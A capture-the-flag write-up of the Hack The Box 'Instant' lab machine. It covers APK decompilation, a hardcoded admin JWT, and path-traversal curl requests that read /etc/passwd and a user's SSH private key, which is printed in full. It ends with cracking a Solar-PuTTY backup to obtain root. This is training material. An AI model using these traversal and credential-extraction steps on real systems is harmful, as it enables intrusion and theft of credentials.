---
title:  "Writeup of Instant machine of Hack The Box"
date: 2025-02-01
mathjax: true
layout: post
categories: writeup
tags: android burpsuite apk mobile-pentest reverse-engineering api-hacking apktool jadx-gui
---

# Resolution of Instant Machine of Hack The Box

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/instant.htb/Instant.webp)

### 📲 *"It's time to hack Mobile Apps! Reverse Engineering is our ally ;)"*

### Enumeration

- Let's start hacking this machine by first performing a basic but highly useful enumeration of all open TCP ports with Nmap:

```bash
$: sudo nmap 10.10.11.37 -p- --open --min-rate=5000 -sS -Pn -oG openPorts.txt -vvv
```

- Now with all TCP open ports discovered with Nmap, we can scan those and its service and execute default Nmap's scripts:

```bash
$: sudo nmap 10.10.11.37 -p 22,80 -sSVC -Pn -oN scanComplete.txt -vvv # Note: -sSVC == -sS -sV and -sC. All in one.
```

```java
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMM6fK04LJ4jNNL950Ft7YHPO9NKONYVCbau/+tQKoy3u7J9d8xw2sJaajQGLqTvyWMolbN3fKzp7t/s/ZMiZNo=
|   256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL+zjgyGvnf4lMAlvdgVHlwHd+/U4NcThn1bx5/4DZYY
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


- As we see, the machine has the **port 22 running SSH** (Secure Shell) service, and the **port 80 running HTTP** (Hyper Text Transfer Protocol) service which, with our Nmap's script executed, we know it's about an **Apache server** on its version `2.4.58`.

- When we enter at `http://10.10.11.37` in our Firefox web browser (with [FoxyProxy](https:/
/addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/){:target="_blank"} configured to redirect all the traffic via **Burp Suite**), we can see that the IP address `10.10.11.37` is resolved by de DNS of our VPN connection with Hack The Box and we are redirected to `http://instant.htb`.

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/instant.htb/instant-machine-domain.webp)

- Now we have this first impression of the website:

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/instant.htb/http-instant-htb-website.webp)

- We can download the app in `.apk` file format by clicking on the button `DOWNLOAD NOW`, where the source is from: `http://instant.htb/downloads/instant.apk`.

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/instant.htb/download-instant-apk.webp)
 
### Exploitation

- If we decompile the `.apk` with **apktool** we can get the android source code of the app, and so, research for interesting endpoints, strings, and much more.

- As well, we can install the `.apk` on our physical or virtual android device for a dynamic analysis (i.e.: using Burp Suite for intercept any traffic after bypass the SSL Pinning).

#### Reverse Engineering

- First, we use **apktool** in order to decompile the file previously downloaded: `instant.apk`.

```bash
$: apktool d instant.apk -o instant
```

- One thing we can do is to search for subdomains under the domain `instant.htb`. This is very simple using *grep* command in *recursive* way:

```bash
$: grep -rni 'instant.htb'
```

```
res/layout/activity_forgot_password.xml:6:        <TextView android:textSize="14.0sp" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_margin="25.0dip" android:text="Please contact support@instant.htb to have your account recovered" android:fontFamily="sans-serif-condensed" android:textAlignment="center" />
res/xml/network_security_config.xml:4:        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
res/xml/network_security_config.xml:5:        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
smali/com/instantlabs/instant/LoginActivity.smali:92:    const-string v1, "http://mywalletv1.instant.htb/api/v1/login"
smali/com/instantlabs/instant/RegisterActivity.smali:78:    const-string p4, "http://mywalletv1.instant.htb/api/v1/register"
smali/com/instantlabs/instant/TransactionActivity.smali:103:    const-string v0, "http://mywalletv1.instant.htb/api/v1/initiate/transaction"
smali/com/instantlabs/instant/TransactionActivity$2.smali:170:    const-string v1, "http://mywalletv1.instant.htb/api/v1/confirm/pin"
smali/com/instantlabs/instant/AdminActivities.smali:29:    const-string v2, "http://mywalletv1.instant.htb/api/v1/view/profile"
smali/com/instantlabs/instant/ProfileActivity.smali:134:    const-string v7, "http://mywalletv1.instant.htb/api/v1/view/profile"
```

- As we see, we got some subdomains that we can inspect: `mywalletv1.instant.htb` and `swagger-ui.instant.htb`

- At `http://swagger-ui.instant.htb` we see the API Documentation for the application:

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/instant.htb/swagger-api-docs-instant.webp)

- After read and understand the API Docs, its suggests that if we have **authorization**, we can read application logs using the API via a query parameter. This can be useful for attacks such as like a Local File Inclusion, Serer-side Request Forgery, etc...

- With **jadx-gui** we open our APK file `instant.apk`. Then we look for some hardcored string that can provide us authorization to use the API.

- This is what we can found:

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/instant.htb/jadx-gui-authorization-token.webp)

```java
public class AdminActivities {
    private String TestAdminAuthorization() {
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // ...
```

- So apparently, the developers have not cleaned up the code leaving us with the **Authorization Token** needed to make unauthorized API requests.

##### API Hacking

- We can perform a Local File Inclusion with *curl* command (remember the argument `--path-as-is`, otherwise, the `../../` won't work):

```bash
$: curl --path-as-is -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../../etc/passwd" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

```
{"/home/shirohige/logs/../../../../../../../../etc/passwd":["root:x:0:0:root:/root:/bin/bash\n","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n","bin:x:2:2:bin:/bin:/usr/sbin/nologin\n","sys:x:3:3:sys:/dev:/usr/sbin/nologin\n","sync:x:4:65534:sync:/bin:/bin/sync\n","games:x:5:60:games:/usr/games:/usr/sbin/nologin\n","man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n","lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n","mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n","news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n","uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n","proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n","backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n","list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n","irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n","_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n","nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n","systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n","dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n","messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n","systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n","pollinate:x:102:1::/var/cache/pollinate:/bin/false\n","polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n","usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n","sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n","shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n","_laurel:x:999:990::/var/log/laurel:/bin/false\n"],"Status":201}
```

- For a clean view, we can format the output with *sed* command:

```bash
$: curl --path-as-is (...) | sed 's/",/\n/g' | sed 's/^"//g' | sed 's/\\n//g'
```

```
{"/home/shirohige/logs/../../../../../../../../etc/passwd":["root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash
_laurel:x:999:990::/var/log/laurel:/bin/false"],"Status":201}
```

- To finally exploit and get a SSH connection, we will read the id_rsa private key from `shirohige` user:

```bash
$: curl --path-as-is -s -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../../home/shirohige/.ssh/id_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

- And to extract the key from the output, we will use again the *sed* command:

```bash
$: curl --path-as-is (...) | sed 's/",/\n/g' | sed 's/^"//g' | sed 's/\\n$//g'
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

- Just save the key on a file like `id_rsa_shirohige` and then add chmod permissions with `chmod 0600 id_rsa_shirohige`

```bash
$: ssh -i id_rsa_shirohige shirohige@10.10.11.37
The authenticity of host '10.10.11.37 (10.10.11.37)' can't be established.
ED25519 key fingerprint is SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.37' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$
```

### Post Exploitation

- LET'S GO! We found an interesting file at `/opt/backups/Solar-PuTTY/sessions-backup.dat`

- If we Google about "Solar PuTTY", we can look for some Python or Bash script on GitHub to crack and read the binary file.

#### Decrypting the file with "SolarPuttyCracker"

- GitHub repository:

[https://github.com/ItsWatchMakerr/SolarPuttyCracker](https://github.com/ItsWatchMakerr/SolarPuttyCracker){:target="_blank"}

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/instant.htb/SolarPuttyCracker-GitHub.webp)

- So to we execute the script, we need before to transfer the file `sessions-backup.dat` to our local machine:

```bash
$: sftp -i id_rsa_shirohige shirohige@10.10.11.37:/opt/backups/Solar-PuTTY/sessions-backup.dat sessions-backup
```

- And now from our terminal shell execute:

```bash
$: source SolarPuttyCracker/env/bin/activate
$: pip install -r SolarPuttyCracker/requirements.txt
$: python3 SolarPuttyCracker/SolarPuttyCracker.py sessions-backup.dat -w /usr/share/wordlists/rockyou.txt
   ____       __             ___         __   __          _____                 __
  / __/___   / /___ _ ____  / _ \ __ __ / /_ / /_ __ __  / ___/____ ___ _ ____ / /__ ___  ____
 _\ \ / _ \ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __//  '_// -_)/ __/
/___/ \___//_/ \_,_//_/   /_/    \_,_/ \__/ \__/ \_, /  \___//_/   \_,_/ \__//_/\_\ \__//_/
                                                /___/
Trying to decrypt using passwords from wordlist...
Decryption successful using password: estrella
[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt
```

- In our `SolarPutty_sessions_decrypted.txt` file we found the root password!

```json
"Credentials": [
    {
        "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
        "CredentialsName": "instant-root",
        "Username": "root",
        "Password": "12**24nzC!r0c%q12",
        "PrivateKeyPath": "",
        "Passphrase": "",
        "PrivateKeyContent": null
    }
],
```

- So now we execute from our SSH shell:

```bash
shirohige@instant:~$ su root
Password:
root@instant:/home/shirohige# whoami
root
root@instant:/home/shirohige# cat /root/root.txt
8dd3420462caa4f8bcd59157834478ac
```

### 🕵️ Pwned!!! 🕵️

**We got the root flag at /root/root.txt and finally complete the machine with full access to the system!! 🏆**

![](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3p2eTBhZzlnMWt3emFva3ljbXB6OHRmcDUxeWdpeXFpdjllbDNuMCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Th3THfJUcShxhl7dNt/giphy.gif)

Happy Hacking!!

----

## Author: Mateo Fumis 
